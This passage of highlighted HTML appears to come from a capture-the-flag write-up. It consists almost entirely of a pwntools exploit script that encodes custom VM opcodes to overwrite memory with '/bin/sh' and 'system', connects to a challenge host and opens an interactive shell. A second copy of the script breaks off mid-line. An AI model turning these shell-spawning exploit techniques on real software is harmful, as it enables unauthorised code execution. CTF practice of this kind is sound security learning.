style="color:#1e754f">(</span><span style="color:#AB5959">0x</span><span style="color:#2F798A">40</span><span style="color:#AB5959">+</span><span style="color:#2F798A">0</span><span style="color:#1e754f">)</span><span style="color:#AB5959">//</span><span style="color:#2F798A">2</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">payload </span><span style="color:#999999">+=</span><span style="color:#393A34"> opcode_load_alt</span><span style="color:#2993a3">(</span><span style="color:#2F798A">1</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#999999">,</span><span style="color:#999999">  </span><span style="color:#1e754f">(</span><span style="color:#AB5959">0x</span><span style="color:#2F798A">58</span><span style="color:#AB5959">+</span><span style="color:#2F798A">0</span><span style="color:#1e754f">)</span><span style="color:#AB5959">//</span><span style="color:#2F798A">2</span><span style="color:#2993a3">)</span><span style="color:#A0ADA0">      # /bin/sh lo</span><br><span style="color:#393A34">payload </span><span style="color:#999999">+=</span><span style="color:#393A34"> opcode_load_alt</span><span style="color:#2993a3">(</span><span style="color:#2F798A">3</span><span style="color:#999999">,</span><span style="color:#2F798A"> 2</span><span style="color:#999999">,</span><span style="color:#2F798A"> 4</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">payload </span><span style="color:#999999">+=</span><span style="color:#393A34"> opcode_add</span><span style="color:#2993a3">(</span><span style="color:#2F798A">1</span><span style="color:#999999">,</span><span style="color:#2F798A"> 3</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">payload </span><span style="color:#999999">+=</span><span style="color:#393A34"> opcode_store_alt</span><span style="color:#2993a3">(</span><span style="color:#2F798A">1</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#999999">,</span><span style="color:#999999"> </span><span style="color:#1e754f">(</span><span style="color:#AB5959">0x</span><span style="color:#2F798A">48</span><span style="color:#AB5959">+</span><span style="color:#2F798A">0</span><span style="color:#1e754f">)</span><span style="color:#AB5959">//</span><span style="color:#2F798A">2</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">payload </span><span style="color:#999999">+=</span><span style="color:#393A34"> opcode_load_alt</span><span style="color:#2993a3">(</span><span style="color:#2F798A">1</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#999999">,</span><span style="color:#999999">  </span><span style="color:#1e754f">(</span><span style="color:#AB5959">0x</span><span style="color:#2F798A">58</span><span style="color:#AB5959">+</span><span style="color:#2F798A">2</span><span style="color:#1e754f">)</span><span style="color:#AB5959">//</span><span style="color:#2F798A">2</span><span style="color:#2993a3">)</span><span style="color:#A0ADA0">      # /bin/sh mid</span><br><span style="color:#393A34">payload </span><span style="color:#999999">+=</span><span style="color:#393A34"> opcode_load_alt</span><span style="color:#2993a3">(</span><span style="color:#2F798A">3</span><span style="color:#999999">,</span><span style="color:#2F798A"> 2</span><span style="color:#999999">,</span><span style="color:#2F798A"> 5</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">payload </span><span style="color:#999999">+=</span><span style="color:#393A34"> opcode_add</span><span style="color:#2993a3">(</span><span style="color:#2F798A">1</span><span style="color:#999999">,</span><span style="color:#2F798A"> 3</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">payload </span><span style="color:#999999">+=</span><span style="color:#393A34"> opcode_store_alt</span><span style="color:#2993a3">(</span><span style="color:#2F798A">1</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#999999">,</span><span style="color:#999999"> </span><span style="color:#1e754f">(</span><span style="color:#AB5959">0x</span><span style="color:#2F798A">48</span><span style="color:#AB5959">+</span><span style="color:#2F798A">2</span><span style="color:#1e754f">)</span><span style="color:#AB5959">//</span><span style="color:#2F798A">2</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">payload </span><span style="color:#999999">+=</span><span style="color:#393A34"> opcode_load_alt</span><span style="color:#2993a3">(</span><span style="color:#2F798A">1</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#999999">,</span><span style="color:#999999">  </span><span style="color:#1e754f">(</span><span style="color:#AB5959">0x</span><span style="color:#2F798A">58</span><span style="color:#AB5959">+</span><span style="color:#2F798A">0</span><span style="color:#1e754f">)</span><span style="color:#AB5959">//</span><span style="color:#2F798A">2</span><span style="color:#2993a3">)</span><span style="color:#A0ADA0">      # System lo</span><br><span style="color:#393A34">payload </span><span style="color:#999999">+=</span><span style="color:#393A34"> opcode_load_alt</span><span style="color:#2993a3">(</span><span style="color:#2F798A">3</span><span style="color:#999999">,</span><span style="color:#2F798A"> 2</span><span style="color:#999999">,</span><span style="color:#2F798A"> 6</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">payload </span><span style="color:#999999">+=</span><span style="color:#393A34"> opcode_add</span><span style="color:#2993a3">(</span><span style="color:#2F798A">1</span><span style="color:#999999">,</span><span style="color:#2F798A"> 3</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">payload </span><span style="color:#999999">+=</span><span style="color:#393A34"> opcode_store_alt</span><span style="color:#2993a3">(</span><span style="color:#2F798A">1</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#999999">,</span><span style="color:#999999"> </span><span style="color:#1e754f">(</span><span style="color:#AB5959">0x</span><span style="color:#2F798A">50</span><span style="color:#AB5959">+</span><span style="color:#2F798A">0</span><span style="color:#1e754f">)</span><span style="color:#AB5959">//</span><span style="color:#2F798A">2</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">payload </span><span style="color:#999999">+=</span><span style="color:#393A34"> opcode_load_alt</span><span style="color:#2993a3">(</span><span style="color:#2F798A">1</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#999999">,</span><span style="color:#999999">  </span><span style="color:#1e754f">(</span><span style="color:#AB5959">0x</span><span style="color:#2F798A">58</span><span style="color:#AB5959">+</span><span style="color:#2F798A">2</span><span style="color:#1e754f">)</span><span style="color:#AB5959">//</span><span style="color:#2F798A">2</span><span style="color:#2993a3">)</span><span style="color:#A0ADA0">      # System mid</span><br><span style="color:#393A34">payload </span><span style="color:#999999">+=</span><span style="color:#393A34"> opcode_load_alt</span><span style="color:#2993a3">(</span><span style="color:#2F798A">3</span><span style="color:#999999">,</span><span style="color:#2F798A"> 2</span><span style="color:#999999">,</span><span style="color:#2F798A"> 7</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">payload </span><span style="color:#999999">+=</span><span style="color:#393A34"> opcode_add</span><span style="color:#2993a3">(</span><span style="color:#2F798A">1</span><span style="color:#999999">,</span><span style="color:#2F798A"> 3</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">payload </span><span style="color:#999999">+=</span><span style="color:#393A34"> opcode_store_alt</span><span style="color:#2993a3">(</span><span style="color:#2F798A">1</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#999999">,</span><span style="color:#999999"> </span><span style="color:#1e754f">(</span><span style="color:#AB5959">0x</span><span style="color:#2F798A">50</span><span style="color:#AB5959">+</span><span style="color:#2F798A">2</span><span style="color:#1e754f">)</span><span style="color:#AB5959">//</span><span style="color:#2F798A">2</span><span style="color:#2993a3">)</span><br><br><br><span style="color:#A0ADA0"># End</span><br><span style="color:#393A34">payload </span><span style="color:#999999">+=</span><span style="color:#393A34"> opcode_halt</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br><br><br><span style="color:#A0ADA0"># Run</span><br><span style="color:#1E754F">assert</span><span style="color:#999999"> </span><span style="color:#2993a3">(</span><span style="color:#1e754f">(</span><span style="color:#998418">len</span><span style="color:#a65e2b">(</span><span style="color:#393A34">payload</span><span style="color:#a65e2b">)</span><span style="color:#AB5959"> //</span><span style="color:#2F798A"> 2</span><span style="color:#1e754f">)</span><span style="color:#AB5959"> </span><span style="color:#AB5959">&#x3C;</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">8000</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">p</span><span style="color:#999999">.</span><span style="color:#393A34">send</span><span style="color:#2993a3">(</span><span style="color:#393A34">p16</span><span style="color:#1e754f">(</span><span style="color:#998418">len</span><span style="color:#a65e2b">(</span><span style="color:#393A34">payload</span><span style="color:#a65e2b">)</span><span style="color:#AB5959"> //</span><span style="color:#2F798A"> 2</span><span style="color:#1e754f">)</span><span style="color:#AB5959"> +</span><span style="color:#393A34"> payload</span><span style="color:#2993a3">)</span><br><br><span style="color:#A0ADA0">######################################################################################</span><br><br><span style="color:#393A34">p</span><span style="color:#999999">.</span><span style="color:#393A34">interactive</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br></code></pre><pre data-theme="dark" class="code-snippet__pre code-snippet__pre--dark"><code class="language-python language-python"><span style="color:#758575DD">#!/bin/python3</span><br><span style="color:#4D9375">from</span><span style="color:#DBD7CAEE"> pwn </span><span style="color:#4D9375">import</span><span style="color:#CB7676"> *</span><br><br><span style="color:#DBD7CAEE">context</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">log_level </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">INFO</span><span style="color:#C98A7D77">'</span><br><span style="color:#DBD7CAEE">context</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">terminal </span><span style="color:#666666">=</span><span style="color:#666666"> </span><span style="color:#5eaab5">[</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">remotinator</span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">vsplit</span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">-x</span><span style="color:#C98A7D77">'</span><span style="color:#5eaab5">]</span><br><span style="color:#DBD7CAEE">context</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">arch </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">amd64</span><span style="color:#C98A7D77">'</span><br><br><br><span style="color:#DBD7CAEE">process_name </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">./chal_patched</span><span style="color:#C98A7D77">'</span><br><span style="color:#DBD7CAEE">elf </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> context</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">binary </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> ELF</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">process_name</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">libc </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> ELF</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">./libc.so.6</span><span style="color:#C98A7D77">'</span><span style="color:#5eaab5">)</span><br><br><span style="color:#C99076">HOST</span><span style="color:#666666"> =</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">vc1k.kctf-453514-codelab.kctf.cloud</span><span style="color:#C98A7D77">"</span><br><span style="color:#C99076">PORT</span><span style="color:#666666"> =</span><span style="color:#4C9A91"> 1337</span><br><br><span style="color:#758575DD">######################################################################################</span><br><br><span style="color:#758575DD"># breakrva [-h] [offset] [module]</span><br><span style="color:#758575DD"># aslr [-h] [{off,on}]</span><br><span style="color:#DBD7CAEE">gdb_script </span><span style="color:#666666">=</span><span style="color:#CB7676"> f</span><span style="color:#C98A7D">'''</span><br><span style="color:#C98A7D">#set breakpoint pending on</span><br><span style="color:#C98A7D">#breakrva 0x1277</span><br><span style="color:#C98A7D">#breakrva 0x14a4</span><br><span style="color:#C98A7D">#breakrva 0x13a7</span><br><span style="color:#C98A7D">#b *run+368</span><br><span style="color:#C98A7D">b *run+786</span><br><span style="color:#C98A7D">continue</span><br><span style="color:#C98A7D">'''</span><br><br><span style="color:#758575DD">######################################################################################</span><br><br><span style="color:#CB7676">def</span><span style="color:#80A665"> connect</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#4D9375">if</span><span style="color:#DBD7CAEE"> args</span><span style="color:#666666">.</span><span style="color:#C99076">REMOTE</span><span style="color:#666666">:</span><br><span style="color:#B8A965">print</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">f</span><span style="color:#C98A7D">"[*] Connecting to </span><span style="color:#4d9375">{</span><span style="color:#C99076">HOST</span><span style="color:#4d9375">}</span><span style="color:#C98A7D"> : </span><span style="color:#4d9375">{</span><span style="color:#C99076">PORT</span><span style="color:#4d9375">}</span><span style="color:#C98A7D">"</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">p </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> remote</span><span style="color:#5eaab5">(</span><span style="color:#C99076">HOST</span><span style="color:#666666">,</span><span style="color:#C99076"> PORT</span><span style="color:#666666">,</span><span style="color:#BD976A"> ssl</span><span style="color:#666666">=</span><span style="color:#4D9375">False</span><span style="color:#5eaab5">)</span><br><span style="color:#4D9375">elif</span><span style="color:#DBD7CAEE"> args</span><span style="color:#666666">.</span><span style="color:#C99076">GDB</span><span style="color:#666666">:</span><br><span style="color:#B8A965">print</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">f</span><span style="color:#C98A7D">'[*] Debugging </span><span style="color:#4d9375">{</span><span style="color:#DBD7CAEE">elf</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">path</span><span style="color:#4d9375">}</span><span style="color:#C98A7D">.'</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">p </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> gdb</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">debug</span><span style="color:#5eaab5">(</span><span style="color:#4d9375">[</span><span style="color:#DBD7CAEE">elf</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">path</span><span style="color:#4d9375">]</span><span style="color:#666666">,</span><span style="color:#BD976A"> gdbscript</span><span style="color:#666666">=</span><span style="color:#DBD7CAEE">gdb_script</span><span style="color:#666666">,</span><span style="color:#BD976A"> aslr</span><span style="color:#666666">=</span><span style="color:#4D9375">False</span><span style="color:#5eaab5">)</span><br><span style="color:#4D9375">else</span><span style="color:#666666">:</span><br><span style="color:#B8A965">print</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">f</span><span style="color:#C98A7D">'[*] Executing </span><span style="color:#4d9375">{</span><span style="color:#DBD7CAEE">elf</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">path</span><span style="color:#4d9375">}</span><span style="color:#C98A7D">.'</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">p </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> process</span><span style="color:#5eaab5">(</span><span style="color:#4d9375">[</span><span style="color:#DBD7CAEE">elf</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">path</span><span style="color:#4d9375">]</span><span style="color:#5eaab5">)</span><br><span style="color:#4D9375">return</span><span style="color:#DBD7CAEE"> p</span><br><br><span style="color:#CB7676">def</span><span style="color:#80A665"> opcode_add</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">op1Idx</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> op2Idx</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">opcode </span><span style="color:#666666">=</span><span style="color:#666666"> </span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">0</span><span style="color:#CB7676"> </span><span style="color:#CB7676">&#x3C;</span><span style="color:#CB7676">&#x3C;</span><span style="color:#4C9A91"> 13</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> |</span><span style="color:#666666"> </span><span style="color:#5eaab5">(</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">op1Idx </span><span style="color:#CB7676">&#x26;</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">7</span><span style="color:#4d9375">)</span><span style="color:#CB7676"> </span><span style="color:#CB7676">&#x3C;</span><span style="color:#CB7676">&#x3C;</span><span style="color:#4C9A91"> 3</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> |</span><span style="color:#666666"> </span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">op2Idx </span><span style="color:#CB7676">&#x26;</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">7</span><span style="color:#5eaab5">)</span><br><span style="color:#4D9375">return</span><span style="color:#DBD7CAEE"> p16</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">opcode</span><span style="color:#5eaab5">)</span><br><br><span style="color:#CB7676">def</span><span style="color:#80A665"> opcode_nand</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">op1Idx</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> op2Idx</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">opcode </span><span style="color:#666666">=</span><span style="color:#666666"> </span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">1</span><span style="color:#CB7676"> </span><span style="color:#CB7676">&#x3C;</span><span style="color:#CB7676">&#x3C;</span><span style="color:#4C9A91"> 13</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> |</span><span style="color:#666666"> </span><span style="color:#5eaab5">(</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">op1Idx </span><span style="color:#CB7676">&#x26;</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">7</span><span style="color:#4d9375">)</span><span style="color:#CB7676"> </span><span style="color:#CB7676">&#x3C;</span><span style="color:#CB7676">&#x3C;</span><span style="color:#4C9A91"> 3</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> |</span><span style="color:#666666"> </span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">op2Idx </span><span style="color:#CB7676">&#x26;</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">7</span><span style="color:#5eaab5">)</span><br><span style="color:#4D9375">return</span><span style="color:#DBD7CAEE"> p16</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">opcode</span><span style="color:#5eaab5">)</span><br><br><span style="color:#CB7676">def</span><span style="color:#80A665"> opcode_jmp_eq</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">op1Idx</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> op2Idx</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> jmp</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">opcode </span><span style="color:#666666">=</span><span style="color:#666666"> </span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">2</span><span style="color:#CB7676"> </span><span style="color:#CB7676">&#x3C;</span><span style="color:#CB7676">&#x3C;</span><span style="color:#4C9A91"> 13</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> |</span><span style="color:#666666"> </span><span style="color:#5eaab5">(</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">op1Idx </span><span style="color:#CB7676">&#x26;</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">7</span><span style="color:#4d9375">)</span><span style="color:#CB7676"> </span><span style="color:#CB7676">&#x3C;</span><span style="color:#CB7676">&#x3C;</span><span style="color:#4C9A91"> 3</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> |</span><span style="color:#666666"> </span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">op2Idx </span><span style="color:#CB7676">&#x26;</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">7</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> |</span><span style="color:#666666"> </span><span style="color:#5eaab5">(</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">jmp </span><span style="color:#CB7676">&#x26;</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">7F</span><span style="color:#4d9375">)</span><span style="color:#CB7676"> </span><span style="color:#CB7676">&#x3C;</span><span style="color:#CB7676">&#x3C;</span><span style="color:#4C9A91"> 6</span><span style="color:#5eaab5">)</span><br><span style="color:#4D9375">return</span><span style="color:#DBD7CAEE"> p16</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">opcode</span><span style="color:#5eaab5">)</span><br><br><span style="color:#CB7676">def</span><span style="color:#80A665"> opcode_halt</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">opcode </span><span style="color:#666666">=</span><span style="color:#666666"> </span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">3</span><span style="color:#CB7676"> </span><span style="color:#CB7676">&#x3C;</span><span style="color:#CB7676">&#x3C;</span><span style="color:#4C9A91"> 13</span><span style="color:#5eaab5">)</span><br><span style="color:#4D9375">return</span><span style="color:#DBD7CAEE"> p16</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">opcode</span><span style="color:#5eaab5">)</span><br><br><span style="color:#CB7676">def</span><span style="color:#80A665"> opcode_load</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">op1Idx</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> op2Idx</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> jmp</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">opcode </span><span style="color:#666666">=</span><span style="color:#666666"> </span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">4</span><span style="color:#CB7676"> </span><span style="color:#CB7676">&#x3C;</span><span style="color:#CB7676">&#x3C;</span><span style="color:#4C9A91"> 13</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> |</span><span style="color:#666666"> </span><span style="color:#5eaab5">(</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">op1Idx </span><span style="color:#CB7676">&#x26;</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">7</span><span style="color:#4d9375">)</span><span style="color:#CB7676"> </span><span style="color:#CB7676">&#x3C;</span><span style="color:#CB7676">&#x3C;</span><span style="color:#4C9A91"> 3</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> |</span><span style="color:#666666"> </span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">op2Idx </span><span style="color:#CB7676">&#x26;</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">7</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> |</span><span style="color:#666666"> </span><span style="color:#5eaab5">(</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">jmp </span><span style="color:#CB7676">&#x26;</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">7F</span><span style="color:#4d9375">)</span><span style="color:#CB7676"> </span><span style="color:#CB7676">&#x3C;</span><span style="color:#CB7676">&#x3C;</span><span style="color:#4C9A91"> 6</span><span style="color:#5eaab5">)</span><br><span style="color:#4D9375">return</span><span style="color:#DBD7CAEE"> p16</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">opcode</span><span style="color:#5eaab5">)</span><br><br><span style="color:#CB7676">def</span><span style="color:#80A665"> opcode_load_alt</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">op1Idx</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> op2Idx</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> jmp</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">opcode </span><span style="color:#666666">=</span><span style="color:#666666"> </span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">5</span><span style="color:#CB7676"> </span><span style="color:#CB7676">&#x3C;</span><span style="color:#CB7676">&#x3C;</span><span style="color:#4C9A91"> 13</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> |</span><span style="color:#666666"> </span><span style="color:#5eaab5">(</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">op1Idx </span><span style="color:#CB7676">&#x26;</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">7</span><span style="color:#4d9375">)</span><span style="color:#CB7676"> </span><span style="color:#CB7676">&#x3C;</span><span style="color:#CB7676">&#x3C;</span><span style="color:#4C9A91"> 3</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> |</span><span style="color:#666666"> </span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">op2Idx </span><span style="color:#CB7676">&#x26;</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">7</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> |</span><span style="color:#666666"> </span><span style="color:#5eaab5">(</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">jmp </span><span style="color:#CB7676">&#x26;</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">7F</span><span style="color:#4d9375">)</span><span style="color:#CB7676"> </span><span style="color:#CB7676">&#x3C;</span><span style="color:#CB7676">&#x3C;</span><span style="color:#4C9A91"> 6</span><span style="color:#5eaab5">)</span><br><span style="color:#4D9375">return</span><span style="color:#DBD7CAEE"> p16</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">opcode</span><span style="color:#5eaab5">)</span><br><br><span style="color:#CB7676">def</span><span style="color:#80A665"> opcode_store</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">op1Idx</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> op2Idx</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> jmp</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">opcode </span><span style="color:#666666">=</span><span style="color:#666666"> </span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">6</span><span style="color:#CB7676"> </span><span style="color:#CB7676">&#x3C;</span><span style="color:#CB7676">&#x3C;</span><span style="color:#4C9A91"> 13</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> |</span><span style="color:#666666"> </span><span style="color:#5eaab5">(</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">op1Idx </span><span style="color:#CB7676">&#x26;</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">7</span><span style="color:#4d9375">)</span><span style="color:#CB7676"> </span><span style="color:#CB7676">&#x3C;</span><span style="color:#CB7676">&#x3C;</span><span style="color:#4C9A91"> 3</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> |</span><span style="color:#666666"> </span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">op2Idx </span><span style="color:#CB7676">&#x26;</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">7</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> |</span><span style="color:#666666"> </span><span style="color:#5eaab5">(</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">jmp </span><span style="color:#CB7676">&#x26;</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">7F</span><span style="color:#4d9375">)</span><span style="color:#CB7676"> </span><span style="color:#CB7676">&#x3C;</span><span style="color:#CB7676">&#x3C;</span><span style="color:#4C9A91"> 6</span><span style="color:#5eaab5">)</span><br><span style="color:#4D9375">return</span><span style="color:#DBD7CAEE"> p16</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">opcode</span><span style="color:#5eaab5">)</span><br><br><span style="color:#CB7676">def</span><span style="color:#80A665"> opcode_store_alt</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">op1Idx</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> op2Idx</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> jmp</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">opcode </span><span style="color:#666666">=</span><span style="color:#666666"> </span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">7</span><span style="color:#CB7676"> </span><span style="color:#CB7676">&#x3C;</span><span style="color:#CB7676">&#x3C;</span><span style="color:#4C9A91"> 13</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> |</span><span style="color:#666666"> </span><span style="color:#5eaab5">(</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">op1Idx </span><span style="color:#CB7676">&#x26;</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">7</span><span style="color:#4d9375">)</span><span style="color:#CB7676"> </span><span style="color:#CB7676">&#x3C;</span><span style="color:#CB7676">&#x3C;</span><span style="color:#4C9A91"> 3</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> |</span><span style="color:#666666"> </span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">op2Idx </span><span style="color:#CB7676">&#x26;</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">7</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> |</span><span style="color:#666666"> </span><span style="color:#5eaab5">(</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">jmp </span><span style="color:#CB7676">&#x26;</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">7F</span><span style="color:#4d9375">)</span><span style="color:#CB7676"> </span><span style="color:#CB7676">&#x3C;</span><span style="color:#CB7676">&#x3C;</span><span style="color:#4C9A91"> 6</span><span style="color:#5eaab5">)</span><br><span style="color:#4D9375">return</span><span style="color:#DBD7CAEE"> p16</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">opcode</span><span style="color:#5eaab5">)</span><br><br><span style="color:#758575DD">######################################################################################</span><br><br><span style="color:#DBD7CAEE">p </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> connect</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br><br><span style="color:#DBD7CAEE">payload  </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> opcode_jmp_eq</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">1</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 1</span><span style="color:#666666">,</span><span style="color:#CB7676"> 0x</span><span 